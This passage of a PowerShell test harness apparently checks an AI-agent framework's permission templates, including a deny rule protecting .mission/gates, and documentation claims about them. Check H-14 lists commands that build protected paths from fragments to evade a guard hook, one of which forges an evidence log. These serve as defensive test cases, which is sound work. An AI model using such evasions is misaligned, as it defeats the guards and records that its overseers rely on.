$h12R1gStart = -1; $h12RowStart = -1
for ($i = 0; $i -lt $h12DocLines.Count; $i++) {
    $h12Line = $h12DocLines[$i]
    if ($h12R1gStart -lt 0 -and $h12Line.StartsWith('- **R-1g (amendment 33, register row 110)')) { $h12R1gStart = $i }
    if ($h12RowStart -lt 0 -and $h12Line.StartsWith('- **ROW 172 ')) { $h12RowStart = $i }
}
$h12R1gEnd = -1; $h12RowEnd = -1
if ($h12R1gStart -ge 0) {
    $h12R1gEnd = $h12DocLines.Count - 1
    foreach ($h12b in $h12BulletStarts) { if ($h12b -gt $h12R1gStart) { $h12R1gEnd = $h12b - 1; break } }
}
if ($h12RowStart -ge 0) {
    $h12RowEnd = $h12DocLines.Count - 1
    foreach ($h12b in $h12BulletStarts) { if ($h12b -gt $h12RowStart) { $h12RowEnd = $h12b - 1; break } }
}
$h12SpansOk = (($h12R1gStart -ge 0) -and ($h12R1gEnd -gt $h12R1gStart) -and
               ($h12RowStart -ge 0) -and ($h12RowEnd -gt $h12RowStart))

$h12R1gText = ''
$h12R1gFlat = ''
$h12RowText = ''
$h12RowFlat = ''
if ($h12SpansOk) {
    $h12R1gText = ($h12DocLines[$h12R1gStart..$h12R1gEnd] -join ([string][char]10))
    # THE PAGE WRAPS AT ABOUT 100 COLUMNS, SO A QUOTED SENTENCE IS SPLIT ACROSS LINES AND A
    # RAW Contains() WOULD MISS IT. Measured while writing this member: the verbatim CLI
    # verdict below straddles two lines of the cured paragraph, and the row went red against a
    # page that carries it. Flattening runs of whitespace to one space is the fix; it makes the
    # row insensitive to re-wrapping and to nothing else.
    $h12R1gFlat = [regex]::Replace($h12R1gText, '\s+', ' ')
    $h12RowText = ($h12DocLines[$h12RowStart..$h12RowEnd] -join ([string][char]10))
    $h12RowFlat = [regex]::Replace($h12RowText, '\s+', ' ')
}

# --- OCCURRENCE counts inside each span, and NOWHERE ELSE -------------------------------------
# COUNTED AS OCCURRENCES, NOT AS LINES. A line-count let a second occurrence share a line with
# the first and hide there; that is refutation (c) in the disclosure above, and it was driven
# green before this was changed. Nothing below quantifies over the whole document -- the
# page-wide rule was withdrawn, see THE RULING above. What these counts DO reach is the two spans,
# and a span ends at the next line starting '- **': a second Write(.mission/gates written beside
# the ROW 172 bullet, without such a line of its own, is inside that span and reds (j). That is
# the only placement this member constrains, and the cure is to open the new paragraph with '- **'.
$h12EditRe  = [regex]::Escape($h12EditNeedle)
$h12WriteRe = [regex]::Escape($h12WriteNeedle)
$h12R1gEditN  = 0; $h12R1gWriteN = 0
$h12RowWriteN = 0; $h12RowEditN  = 0
if ($h12SpansOk) {
    $h12R1gEditN  = ([regex]::Matches($h12R1gText, $h12EditRe)).Count
    $h12R1gWriteN = ([regex]::Matches($h12R1gText, $h12WriteRe)).Count
    $h12RowEditN  = ([regex]::Matches($h12RowText, $h12EditRe)).Count
    $h12RowWriteN = ([regex]::Matches($h12RowText, $h12WriteRe)).Count
}

# --- (h) EACH CITATION BOUND TO THE CLAIM IT ANCHORS, BY DISTANCE TO THAT CLAIM'S NEEDLE -------
# THE ANCHOR TABLE. Each entry names a role template and the NEEDLE whose line the page cites.
# The line numbers are MEASURED from the JSON here; not one of them is hand-authored.
#
# THE THREE SHAPES THIS ROW HAS HAD, AND WHY IT IS ON THE THIRD.
#   SHAPE 1 -- A SET of the line numbers cited anywhere in the span, compared both ways. It bound
#     the bag and not the pairing: EXCHANGING worker.json's two citations -- the deny cited at
#     :35, the verdict cited at :13 -- was GREEN, all 22, EXIT 0. And because it also ran the
#     other way, a NEW AND TRUE citation reded it.
#   SHAPE 2 (round 4) -- PER SENTENCE. Each claim was bound to the citations appearing in the
#     sentences carrying its needle, set-equal to the measured line. It held the exchange. It
#     broke on an HONEST SENTENCE SPLIT, and it broke again on a TRUE citation added inside a
#     binder sentence: a round-5 finding, both driven red against a factually correct page, one
#     of them printing "cites (none)" about a line the page plainly carries.
#   SHAPE 3 (this round) -- NEAREST CITATION. For each claim, every citation of THAT CLAIM'S FILE
#     anywhere in the span is measured for its character gap to the nearest occurrence of that
#     claim's needle in the flattened span. The citation with the smallest gap must be the line
#     source measures; ties must all be that line. Sentence boundaries stop mattering, so a split
#     is green; a citation further away than the bound one is not the nearest, so a new true
#     citation is green wherever it lands, the binder sentence included. ROT, DELETION, EXCHANGE
#     and an anchor that MOVED in the JSON each change which citation is nearest, so each is red.
#   AND SEPARATELY, FOR EVERY CITATION IN THE SPAN, BOUND OR NOT: it must RESOLVE -- the file must
#     be one of the three templates and the line or range must lie inside that file's real line
#     count.
#
# THE BOUND OF THE PAIRING, STATED EXACTLY BECAUSE IT IS NOT WHOLE. Nearness is a PROXY for
# attribution, and two shapes escape it.
#   * A NEW SENTENCE that cites a real line and attributes it to the wrong thing IN ENGLISH --
#     "that inert spelling verdict is recorded at worker.json:13" -- carries no measured needle,
#     so nothing in it is checkable against source beyond the fact that worker.json really has a
#     line 13, which it does. NOT CAUGHT. Driven, stayed green, disclosed rather than chased:
#     deciding that its English refers to the verdict measured at :35 is a claim about MEANING,
#     and this member's header records what happened twice when a text rule was asked to decide
#     meaning.
#   * Conversely, a new sentence that REPEATS a claim's needle immediately beside a different line
#     of the same file becomes the nearest citation and reds that claim. That is correct when the
#     sentence mis-attributes and wrong when it merely restates; the member cannot tell those two
#     apart either, and the cure for an honest restatement is to cite nothing in it.
$h12Table = @(
    [pscustomobject]@{ File = 'orchestrator.json'; Needle = $h12EditNeedle; What = 'the gates deny' }
    [pscustomobject]@{ File = 'worker.json';       Needle = $h12EditNeedle; What = 'the gates deny' }
    [pscustomobject]@{ File = 'worker.json';       Needle = $h12InertQuote; What = "the CLI's inert-spelling verdict" }
    [pscustomobject]@{ File = 'validator.json';    Needle = '"defaultMode": "dontAsk"'; What = 'the deny-by-default mode' }
    [pscustomobject]@{ File = 'validator.json';    Needle = 'the deny enumeration is the whole of the shell boundary'; What = 'the measured shell-boundary residual' }
)
$h12Src = @{
    'orchestrator.json' = $h12OrchLines
    'worker.json'       = $h12WorkLines
    'validator.json'    = $h12ValdLines
}
$h12Claims       = @()
$h12AnchorLines  = @()
$h12AnchorUnique = $true
foreach ($h12row in $h12Table) {
    $h12srcLines = $h12Src[$h12row.File]
    $h12hits = @()
    for ($i = 0; $i -lt $h12srcLines.Count; $i++) {
        if ($h12srcLines[$i].Contains($h12row.Needle)) { $h12hits += ($i + 1) }
    }
    if ($h12hits.Count -ne 1) { $h12AnchorUnique = $false }
    $h12shown = '(none)'
    if ($h12hits.Count -gt 0) { $h12shown = ($h12hits -join ',') }
    $h12AnchorLines += ('       ' + $h12row.File.PadRight(19) + $h12row.What.PadRight(38) + 'measured line(s): ' + $h12shown)
    if ($h12hits.Count -eq 1) {
        $h12Claims += [pscustomobject]@{
            File   = $h12row.File
            Binder = $h12row.Needle
            What   = $h12row.What
            Expect = ([string]$h12hits[0])
        }
    }
}
# the one RANGE anchor: validator.json's deny array, taken from the same open-to-close
# measurement rows (a) and (b) use, so there is one measurement of a deny array in this member
# and not two. Its binder is the page's own phrase for it, which is a WORDING-LEVEL binder and
# is the weakest of the six -- rewording "deny list" would red this row and would deserve to,
# since it is the sentence that carries the citation. The range itself is now bound to the PARSED
# permissions.deny array (see $h12RangeBound), so the number the page is checked against is the
# array's own, not whatever a "deny": [ substring happened to open.
$h12DenyOpen  = $h12DenyOpenAt['validator.json']
$h12DenyClose = $h12DenyCloseAt['validator.json']
$h12DenyOk    = (($h12DenyKeyN['validator.json'] -eq 1) -and ($h12DenyOpen -gt 0) -and
                 ($h12DenyClose -gt $h12DenyOpen) -and $h12PathOk['validator.json'] -and
                 $h12RangeBound['validator.json'])
if ($h12DenyOk) {
    $h12Claims += [pscustomobject]@{
        File   = 'validator.json'
        Binder = 'deny list'
        What   = 'the deny array, open..close'
        Expect = ('' + $h12DenyOpen + '-' + $h12DenyClose)
    }
}
$h12AnchorLines += ('       ' + 'validator.json'.PadRight(19) + 'the deny array, open..close'.PadRight(38) + 'measured line(s): ' + $h12DenyOpen + '-' + $h12DenyClose)

# SENTENCES. Still split, because row (k) needs the sentence that CHARACTERISES the rule, and
# because the detail prints how many there are. The split is after a full stop followed by
# whitespace, allowing the page's closing markup (**, backtick, bracket, quote) to sit between the
# two. Measured while writing this: splitting on a bare '. ' alone missed the boundary at "so it
# is sized here.** By the FILE-TOOL route", which would have merged two claims into one sentence.
# Version strings like 2.1.241 and paths like .mission/gates are untouched because neither has
# whitespace after the stop. ROW (h) NO LONGER USES SENTENCES AT ALL -- see the header's round-5 findings.
$h12CiteRe  = 'tools/lam/settings/(orchestrator|worker|validator)\.json:(\d+)(?:-(\d+))?'
$h12SentRe  = '(?<=\.)[\*`\)\]"'')]*\s+'
$h12Sent    = @()
if ($h12SpansOk) { $h12Sent = @([regex]::Split($h12R1gFlat, $h12SentRe)) }

# EVERY citation in the span, with its character offsets, measured once and used by both the
# pairing and the resolution check.
$h12CiteHits   = @()
$h12AllCites   = @()
$h12Unresolved = @()
if ($h12SpansOk) {
    foreach ($h12m in [regex]::Matches($h12R1gFlat, $h12CiteRe)) {
        $h12cf = $h12m.Groups[1].Value + '.json'
        $h12c1 = [int]$h12m.Groups[2].Value
        $h12c2 = $h12c1
        if ($h12m.Groups[3].Success) { $h12c2 = [int]$h12m.Groups[3].Value }
        $h12cs = '' + $h12c1
        if ($h12c2 -ne $h12c1) { $h12cs = $h12cs + '-' + $h12c2 }
        $h12CiteHits += [pscustomobject]@{
            File  = $h12cf
            Value = $h12cs
            Start = $h12m.Index
            Stop  = ($h12m.Index + $h12m.Length)
        }
        $h12AllCites += ($h12cf + ':' + $h12cs)
        $h12cn = $h12Src[$h12cf].Count
        if (($h12c1 -lt 1) -or ($h12c2 -lt $h12c1) -or ($h12c2 -gt $h12cn)) {
            $h12Unresolved += ($h12cf + ':' + $h12cs + ' -- that file has ' + $h12cn + ' lines')
        }
    }
}

$h12Unbound  = @()
$h12Mismatch = @()
$h12BindLines = @()
foreach ($h12c in $h12Claims) {
    $h12nOcc = @()
    if ($h12SpansOk) {
        foreach ($h12nm in [regex]::Matches($h12R1gFlat, [regex]::Escape($h12c.Binder))) {
            $h12nOcc += [pscustomobject]@{ Start = $h12nm.Index; Stop = ($h12nm.Index + $h12nm.Length) }
        }
    }
    $h12best     = [int]::MaxValue
    $h12bestVals = @()
    if ($h12nOcc.Count -gt 0) {
        foreach ($h12cit in $h12CiteHits) {
            if ($h12cit.File -ne $h12c.File) { continue }
            $h12gap = [int]::MaxValue
            foreach ($h12n in $h12nOcc) {
                $h12g = 0
                if ($h12cit.Start -ge $h12n.Stop) { $h12g = $h12cit.Start - $h12n.Stop }
                elseif ($h12n.Start -ge $h12cit.Stop) { $h12g = $h12n.Start - $h12cit.Stop }
                if ($h12g -lt $h12gap) { $h12gap = $h12g }
            }
            if ($h12gap -lt $h12best) { $h12best = $h12gap; $h12bestVals = @($h12cit.Value) }
            elseif ($h12gap -eq $h12best) { $h12bestVals += $h12cit.Value }
        }
    }
    $h12gotU  = @($h12bestVals | Sort-Object -Unique)
    $h12gotSh = '(none)'
    if ($h12gotU.Count -gt 0) { $h12gotSh = ($h12gotU -join ',') }
    if ($h12nOcc.Count -eq 0) {
        $h12Unbound += ($h12c.File + ' <' + $h12c.What + '>')
        $h12gotSh = '(the page carries no sentence making this claim)'
    } elseif ($h12gotU.Count -eq 0) {
        $h12Mismatch += ($h12c.File + ' <' + $h12c.What + '> cites that file nowhere in the span, source measures ' + $h12c.Expect)
    } elseif (($h12gotU -join ',') -ne $h12c.Expect) {
        $h12Mismatch += ($h12c.File + ' <' + $h12c.What + '> nearest citation is ' + $h12gotSh + ', source measures ' + $h12c.Expect)
    }
    $h12gapSh = '(n/a)'
    if ($h12best -ne [int]::MaxValue) { $h12gapSh = ('' + $h12best) }
    $h12BindLines += ('       ' + $h12c.File.PadRight(19) + $h12c.What.PadRight(38) +
                      'source ' + $h12c.Expect.PadRight(8) + ' nearest ' + $h12gotSh.PadRight(10) + ' gap ' + $h12gapSh)
}

$h12AllCitesU = @($h12AllCites | Sort-Object -Unique)
$h12CiteOk = ($h12SpansOk -and $h12AnchorUnique -and $h12DenyOk -and
              ($h12Unbound.Count -eq 0) -and ($h12Mismatch.Count -eq 0) -and ($h12Unresolved.Count -eq 0))

# --- (k) THE PAGE'S VERB, BOUND TO THE TEMPLATE'S -------------------------------------------
# A ROUND-5 FINDING. The sentences of the R-1g span that carry the Edit(.mission/gates/**)
# literal are the sentences that CHARACTERISE the rule. At least one must call it a deny; none
# may call it a grant; and the parse must agree that it really is in permissions.deny. The
# lexicon is fixed and printed in the detail. THE SCOPE IS THE LITERAL-BEARING SENTENCES, NOT THE
# SPAN: the span says "grant" once today about the validator's result-file grant, and a span-wide
# ban would red a true page.
$h12DenyWords  = @('deny', 'denies', 'denied', 'denial', 'denying', 'deny-by-default')
$h12GrantWords = @('allow', 'allows', 'allowed', 'allowlist', 'allow-list', 'grant', 'grants', 'granted', 'permit', 'permits', 'permitted')
$h12VerbSent   = @()
foreach ($h12s in $h12Sent) {
    if ($h12s.Contains($h12EditNeedle)) { $h12VerbSent += $h12s }
}
$h12SaysDeny  = $false
$h12SaysGrant = @()
foreach ($h12s in $h12VerbSent) {
    foreach ($h12w in $h12DenyWords) {
        if ([regex]::IsMatch($h12s, '(?i)\b' + [regex]::Escape($h12w) + '\b')) { $h12SaysDeny = $true }
    }
    foreach ($h12w in $h12GrantWords) {
        if ([regex]::IsMatch($h12s, '(?i)\b' + [regex]::Escape($h12w) + '\b')) { $h12SaysGrant += $h12w }
    }
}
$h12SaysGrantU = @($h12SaysGrant | Sort-Object -Unique)
$h12TemplateVerb = 'unresolved'
if (($h12DenyHas['orchestrator.json'] -eq 1) -and ($h12DenyHas['worker.json'] -eq 1)) { $h12TemplateVerb = 'deny' }
$h12VerbOk = ($h12SpansOk -and ($h12VerbSent.Count -ge 1) -and $h12SaysDeny -and
              ($h12SaysGrantU.Count -eq 0) -and ($h12TemplateVerb -eq 'deny'))

$h12InertOk = ($h12SpansOk -and $h12R1gFlat.Contains($h12InertQuote) -and ($h12WorkInert.Count -eq 1))
$h12ValdOk  = ($h12SpansOk -and $h12R1gFlat.Contains('validator.json') -and ($h12ValdGates.Count -eq 0))

# --- (j) the erratum's quotation of the register, INSIDE ITS OWN BULLET AND NOWHERE ELSE -------
# The wrong spelling must occur exactly once IN THIS SPAN, must FOLLOW the words attributing it to
# the register, and the corrected spelling must FOLLOW the words attributing it to the actual
# rule. Occurrences, not lines. See the disclosure above for what this can and cannot catch, and
# for why nothing here looks outside this bullet.
$h12AttribRe = 'Register row 172 spells it[^A-Za-z0-9]{0,8}Write\(\.mission/gates'
$h12CorrectRe = 'The actual rule in .{0,240}?is[^A-Za-z0-9]{0,8}Edit\(\.mission/gates/\*\*\)'
$h12RowAttrib  = $false
$h12RowCorrect = $false
if ($h12SpansOk) {
    $h12RowAttrib  = [regex]::IsMatch($h12RowFlat, $h12AttribRe)
    $h12RowCorrect = [regex]::IsMatch($h12RowFlat, $h12CorrectRe)
}
$h12QuoteOk = ($h12SpansOk -and ($h12RowWriteN -eq 1) -and ($h12RowEditN -ge 1) -and
               $h12RowAttrib -and $h12RowCorrect)

$h12a = (($h12OrchEdit.Count -eq 1) -and $h12OrchInDeny -and $h12PathOk['orchestrator.json'] -and
         ($h12DenyHas['orchestrator.json'] -eq 1) -and $h12RangeBound['orchestrator.json'])
$h12b = (($h12WorkEdit.Count -eq 1) -and $h12WorkInDeny -and $h12PathOk['worker.json'] -and
         ($h12DenyHas['worker.json'] -eq 1) -and $h12RangeBound['worker.json'])
$h12c = (($h12OrchWrite.Count -eq 0) -and ($h12WorkWrite.Count -eq 0))
$h12d = (($h12ValdGates.Count -eq 0) -and $h12PathOk['validator.json'] -and ($h12DenyHas['validator.json'] -eq 0))
$h12e = $h12SpansOk
$h12f = ($h12R1gEditN -ge 1)
$h12g = ($h12R1gWriteN -eq 0)
$h12h = $h12CiteOk
$h12i = $h12InertOk
$h12j = ($h12ValdOk -and $h12QuoteOk)
$h12k = $h12VerbOk

$h12Ok = ($h12Reached -and $h12a -and $h12b -and $h12c -and $h12d -and $h12e -and
          $h12f -and $h12g -and $h12h -and $h12i -and $h12j -and $h12k)

$h12AllShow        = '(none)'
$h12UnboundShow    = '(none)'
$h12MismatchShow   = '(none)'
$h12UnresolvedShow = '(none)'
$h12ParseShow      = '(none)'
$h12GrantShow      = '(none)'
if ($h12AllCitesU.Count  -gt 0) { $h12AllShow        = ($h12AllCitesU  -join '  ') }
if ($h12Unbound.Count    -gt 0) { $h12UnboundShow    = ($h12Unbound    -join ' | ') }
if ($h12Mismatch.Count   -gt 0) { $h12MismatchShow   = ($h12Mismatch   -join ' | ') }
if ($h12Unresolved.Count -gt 0) { $h12UnresolvedShow = ($h12Unresolved -join ' | ') }
if ($h12ParseBad.Count   -gt 0) { $h12ParseShow      = ($h12ParseBad   -join ' | ') }
if ($h12SaysGrantU.Count -gt 0) { $h12GrantShow      = ($h12SaysGrantU -join ',') }

$h12detail = @"
    page      : docs/framework/LAM-ACCEPT.md, read from $(if ($h12DocFrom) { $h12DocFrom } else { 'NOWHERE' })   ($($h12DocLines.Count) lines)
    templates : tools/lam/settings/{orchestrator,worker,validator}.json
    R-1g span : lines $($h12R1gStart + 1)..$($h12R1gEnd + 1)      ROW 172 span: lines $($h12RowStart + 1)..$($h12RowEnd + 1)
                EACH SPAN ENDS AT THE NEXT LINE STARTING WITH THE LITERAL '- **'. That is
                NARROWER than "the next top-level bullet" and this member says so rather than
                rounding it up: measured on this run, $h12DashLines lines begin '- ' and
                $($h12BulletStarts.Count) of them begin '- **', so $h12DashOnly top-level bullets
                do NOT end a span. '- **' is the page's amendment-row convention and is what the
                carry-forward cure below tells the next seat to type.
    missing inputs: $(if ($h12Absent.Count -eq 0) { '(none)' } else { $h12Absent -join ', ' })
    JSON parse    : $h12ParseShow

    WHAT THIS MEMBER CHECKS, AND WHAT IT DOES NOT -- STATED HERE SO NO READER OVERREADS IT.
    IT CHECKS two things: (1) that R-1g's claims agree with the role templates R-1g cites -- the
    rule is the Edit( spelling AND it is an element of the array at the OBJECT PATH
    permissions.deny of each template (PARSED, not string-matched), R-1g calls it a deny and
    never a grant, and every file:line R-1g prints pairs with the claim it stands nearest to and
    re-derives from the JSON; and (2) that amendment 36's ROW 172 bullet still carries the
    erratum's quotation, checked INSIDE THAT ONE BULLET and nowhere else.
    IT DOES NOT CHECK, AND CANNOT CHECK, that every other mention of the wrong spelling elsewhere
    on this page is a REPORT of the erratum rather than an ASSERTION of it. That is a claim about
    MEANING. It was attempted twice -- "occurs exactly once page-wide", then "every line carrying
    it sits in a bullet that also carries Edit(.mission/gates/**)" -- and BOTH attempts were
    refuted by driving them: each made honest, convention-faithful amendment writing RED while
    letting a bullet that stated a FALSEHOOD pass. The page-wide rule is WITHDRAWN and is not
    replaced. Both refutations are recorded in this member's header comment so a later seat does
    not build a third.

    SOURCE OF TRUTH -- the role templates, PARSED here and not quoted from the page:
    a) orchestrator.json carries exactly one Edit(.mission/gates/**), and
       ConvertFrom-Json finds it as an element of permissions.deny --
       THE OBJECT PATH, not a line under a "deny": [ substring; the
       located line range is bound to that parsed array element-by-element : $h12a   (expect True)  line(s): $(if ($h12OrchEdit.Count) { $h12OrchEdit -join ',' } else { '(none)' })   permissions.deny reached: $($h12PathOk['orchestrator.json'])  element hits: $($h12DenyHas['orchestrator.json'])  lines $h12DenyShowOrch bound to the parse: $($h12RangeBound['orchestrator.json'])  (one "deny": [ key: $($h12DenyKeyN['orchestrator.json'] -eq 1))
    b) worker.json       carries exactly one Edit(.mission/gates/**), and
       ConvertFrom-Json finds it as an element of permissions.deny         : $h12b   (expect True)  line(s): $(if ($h12WorkEdit.Count) { $h12WorkEdit -join ',' } else { '(none)' })   permissions.deny reached: $($h12PathOk['worker.json'])  element hits: $($h12DenyHas['worker.json'])  lines $h12DenyShowWork bound to the parse: $($h12RangeBound['worker.json'])  (one "deny": [ key: $($h12DenyKeyN['worker.json'] -eq 1))
    c) NEITHER template carries a Write(.mission/gates spelling            : $h12c   (expect True)  orch=$($h12OrchWrite.Count) work=$($h12WorkWrite.Count)
    d) validator.json carries NO .mission/gates entry, any spelling, and
       its parsed permissions.deny holds no gates rule either              : $h12d   (expect True)  text hits=$($h12ValdGates.Count)  permissions.deny reached: $($h12PathOk['validator.json'])  element hits: $($h12DenyHas['validator.json'])

    THE PAGE -- R-1g, the clause amendment 36 named and deliberately did not fix:
    e) both spans located by their own headings                            : $h12e   (expect True)
    f) R-1g spells the deny Edit(.mission/gates/**)                        : $h12f   (expect True)  occurrences (not lines)=$h12R1gEditN
    g) R-1g carries NO Write(.mission/gates spelling                       : $h12g   (expect True)  occurrences (not lines)=$h12R1gWriteN
    k) R-1g CALLS IT A DENY AND NEVER A GRANT, and the parse agrees the
       rule really sits in permissions.deny                                : $h12k   (expect True)  sentences carrying the literal=$($h12VerbSent.Count)  says deny=$h12SaysDeny  grant-words found=$h12GrantShow  template verb (parsed)=$h12TemplateVerb
       SCOPE, STATED: the grant-word ban covers ONLY the sentences that carry
       Edit(.mission/gates/**), not the whole span -- the span says "grant" once today about the
       validator's own result-file grant, and a span-wide ban would red a true page. The cost is
       that a sentence which both carries the literal and mentions an allow list for some other
       reason reds this row; the cure is to put that remark in its own sentence.
       deny lexicon : $($h12DenyWords -join ', ')
       grant lexicon: $($h12GrantWords -join ', ')
    h) EVERY role-template citation R-1g makes is BOUND TO THE CLAIM IT
       ANCHORS -- the citation of a claim's file standing NEAREST that
       claim's needle must be the line measured in source -- and every
       citation in the span, bound or not, resolves inside the file it names : $h12h   (expect True)  anchors unique=$h12AnchorUnique  deny-array located and parse-bound=$h12DenyOk  sentences=$($h12Sent.Count)  citations=$($h12CiteHits.Count)
$($h12AnchorLines -join ([string][char]13 + [string][char]10))
       THE PAIRING, CLAIM BY CLAIM -- gap is the character distance from the claim's needle to its
       nearest citation of that file in the flattened span:
$($h12BindLines -join ([string][char]13 + [string][char]10))
       every citation in the span : $h12AllShow
       claims the page never makes: $h12UnboundShow
       claims paired to a wrong line: $h12MismatchShow
       citations that do not resolve: $h12UnresolvedShow
       A NEW CITATION THAT RESOLVES AGAINST SOURCE IS GREEN BY DESIGN, AND SO IS AN HONEST
       SENTENCE SPLIT (a round-5 finding): this page accumulates amendments, amendment 38 may add
       a citation, and a member that reds correct writing is the same defect as the page-wide
       prose invariant already withdrawn above. NOT CAUGHT, AND SAID SO: a NEW SENTENCE citing a
       real line while attributing it to the wrong claim in English carries no measured needle, so
       nothing in it is checkable against source beyond the line existing. Conversely a new
       sentence that REPEATS a claim's needle right beside a different line of the same file
       becomes the nearest citation and reds that claim -- correct if it mis-attributes, wrong if
       it merely restates. Both shapes are disclosed rather than chased.
    i) R-1g quotes the CLI's inert-spelling verdict (compared against the
       span with its line wrapping flattened), and worker.json really
       carries that sentence on its own face, exactly once                 : $h12i   (expect True)  worker.json line(s): $(if ($h12WorkInert.Count) { $h12WorkInert -join ',' } else { '(none)' })

    THE ERRATUM MUST SURVIVE -- amendment 36 QUOTES the register's wrong spelling on purpose:
    j) R-1g names validator.json as the third template with no deny, AND
       amendment 36's ROW 172 bullet still carries the wrong spelling
       exactly once BY OCCURRENCE, ATTRIBUTED TO THE REGISTER, with the
       corrected spelling attributed to the actual rule beside it --
       measured inside that bullet's span only                             : $h12j   (expect True)  ROW 172 Write occurrences=$h12RowWriteN Edit occurrences=$h12RowEditN attributed=$h12RowAttrib corrected=$h12RowCorrect

    inputs reached                                                         : $h12Reached   (expect True)

    WHAT A RED ROW MEANS. (g) red with (a)/(b) green: R-1g itself regressed to the wrong spelling
    -- that is the amendment 36 erratum, un-cured, on the page side. (k) red: R-1g now calls the
    gates rule a GRANT, or stopped calling it a deny, or the parse says it is no longer in
    permissions.deny -- read the grant-words line for which word was found. (j) red: somebody
    "corrected" the erratum's QUOTATION of the register, or INVERTED which spelling is attributed
    to which source, or smuggled a SECOND occurrence into that bullet -- each destroys the erratum
    rather than curing it. (h) red: read the PAIRING table -- a claim whose nearest citation is
    not the line source measures (rot, deletion, or two citations exchanged between claims), a
    claim the page no longer makes at all, or a citation that names a line the file does not have.
    An anchor that MOVED in the JSON while the page stood still reds it the same way, which is the
    shelf-life failure this document records for every bare line number in a moving file. A
    citation that is merely NEW, or one displaced by a sentence split, is not a red and must not
    be made one. (a)/(b) red: either the TEMPLATES moved and the page is now the stale half, or --
    and this is what the rows were extended to catch in round 5 -- the rule is still spelled
    Edit(.mission/gates/**) on a line inside something that looks like a deny array, but
    ConvertFrom-Json cannot reach it at permissions.deny, which makes it a rule that governs
    nothing while reading exactly the same. Renaming the containing key and reparenting the array
    were both driven GREEN against the round-4 shape and are both RED now. (c)/(d) red: the
    TEMPLATES moved; re-measure before editing either side. THE REGISTER IS NOT READ BY THIS
    MEMBER: .mission/** is out of bounds to this build, so (j) binds the page's ORIENTATION and
    not the quotation's fidelity.
    WHAT THIS MEMBER CONSTRAINS ABOUT FUTURE AMENDMENTS -- STATED NARROWLY, BECAUSE AN EARLIER
    DRAFT OF THIS PARAGRAPH SAID "NEW AMENDMENT SECTIONS ANYWHERE ON THIS PAGE DO NOT MOVE THIS
    MEMBER" AND THAT WAS TOO STRONG. Nothing here quantifies over the whole document, and the
    page-wide rule stays withdrawn -- but TWO SPANS ARE MEASURED, and each ends at the NEXT LINE
    STARTING WITH THE LITERAL '- **', so text written beside a bullet without such a line of its
    own lands inside it.
    THERE IS EXACTLY ONE SHAPE TO AVOID, AND HERE IT IS:
      * A carry-forward paragraph placed BESIDE the ROW 172 bullet -- after its heading line and
        before the next line starting '- **' -- WITHOUT such a line of its own, quoting
        Write(.mission/gates a second time. Row (j) counts OCCURRENCES inside that span and
        requires exactly one, because a second occurrence there is how the erratum's quotation
        was destroyed in refutation (c). Driven for this round: an honest three-line amendment-38
        carry-forward written that way took ROW 172 Write occurrences to 2 and reded (j).
      * THE CURE IS FOUR CHARACTERS OF STRUCTURE. Open the carry-forward with '- **'. It is then
        outside both spans, and it may quote either spelling as often as it likes, anywhere on the
        page, including immediately after ROW 172. That shape was driven and is GREEN.
    THE SAME STRUCTURE APPLIES TO R-1g, and there the constraint is content rather than placement:
    text added INSIDE the R-1g span must not carry Write(.mission/gates at all (row g), must not
    call the gates rule a grant in a sentence that carries the Edit literal (row k), and a
    role-template citation added there must resolve against the file it names and must not come to
    stand nearer a bound claim's needle than that claim's own citation (row h). A citation that
    resolves and is not the nearest is green however new it is.
"@
Check -Id 'H-12' -Title "the page's permission-layer claim agrees with the role templates it cites: the gates rule really is Edit(.mission/gates/**) AT THE OBJECT PATH permissions.deny of each template (parsed, not string-matched), R-1g calls that rule a DENY and never a grant, every role-template file:line R-1g cites pairs with the claim it stands nearest to and re-derives against source, validator.json is named as carrying none, and amendment 36's ROW 172 bullet still quotes the register's wrong spelling exactly once with its attribution intact" `
      -Ok $h12Ok -Skipped:($null -eq $h12DocText) -Detail $(if ($null -eq $h12DocText) { "      SKIPPED: the page is not here -- $h12DocRel is neither in this checkout at its sha256 $($h12DocPin.Substring(0, 8)) (after the fold) nor in its history`n" + $h12detail } else { $h12detail })

# =============================================================================================
# H-14 -- THE PATH-FRAGMENT EVASION
# =============================================================================================
# A protected/parent path spelled IN PIECES across a command carries no literal protected
# substring, so A1's Get-EvidencePathHits matcher AND the metacharacter gate ($ShellMetaPattern
# holds none of '+', a quote, or the letters of `chr`) both miss it. Real disclosed spellings:
# '.mis'+'sion'; chr(46)+'mission-runtime'; a variable literal-assigned earlier then joined;
# Join-Path with literal components. Every REFUSE row below was measured ALLOWED against the
# UNEDITED next-gen library (the hole is real); the cure now DENIES each with a reason that names
# the assembly. CASES BOTH WAYS is load-bearing: the ALLOW rows are innocent concatenation/Join
# that must NOT be reddened -- '.mis'+'cellaneous', Join-Path over a variable or non-protected
# literals, a commit message that merely QUOTES the words (even the '+' assembly itself, because
# the scan is quote-aware), and Join-Path '.mission' 'ledger' (parent already visible in the raw
# text, so ordinary ceremony is left exactly as A1 leaves it). Driven through the REAL guard hook.
#
# NEW-HIT ONLY / QUOTE-AWARE are the two false-positive controls, and the ALLOW population exists
# to prove them: A7 assembles a PARENT path already present in the raw text (no new hit -> allow),
# and A5 embeds the exact fragmentation string inside a double-quoted commit message (concat inside
# one quoted argument is never read as structure -> allow).
$asmRefuse = @(
    @{ n = 'concat -> protected';          c = "Set-Content -Path ('.mis' + 'sion' + '/evidence/x/log.jsonl') -Value forged" },
    @{ n = 'chr() -> parent';              c = "Write-Output (chr(46) + 'mission-runtime')" },
    @{ n = 'chr() -> protected';           c = "Write-Output (chr(46) + 'mission-runtime/evidence/x/log.jsonl')" },
    @{ n = 'variable concat -> protected'; c = "`$p = '.mis'; `$q = 'sion'; Write-Output (`$p + `$q + '/evidence/x/log.jsonl')" },
    @{ n = 'variable in token -> protect'; c = "`$d = '.mis' + 'sion'; Get-Content `$d/evidence/x/log.jsonl" },
    @{ n = 'Join-Path -> protected';       c = "Join-Path '.mission' 'evidence'" },
    @{ n = 'dq/mixed concat -> protected'; c = "Write-Output (`"tools/fram`" + 'ework/hooks')" },
    @{ n = 'concat -> parent (.mission)';  c = "Write-Output ('.mis' + 'sion')" },
    @{ n = 'Combine frag arg -> parent';   c = "Write-Output ([IO.Path]::Combine('.mis' + 'sion', 'evidence'))" },
    @{ n = '+= build -> protected';        c = "`$s = '.mis'; `$s += 'sion'; Write-Output (`$s + '/evidence')" },
    @{ n = 'concat -> .claude/settings';   c = "Write-Output ('.cla' + 'ude/settings.json')" }
)
$asmAllow = @(
    @{ n = 'innocent .miscellaneous';      c = "Write-Output ('.mis' + 'cellaneous')" },
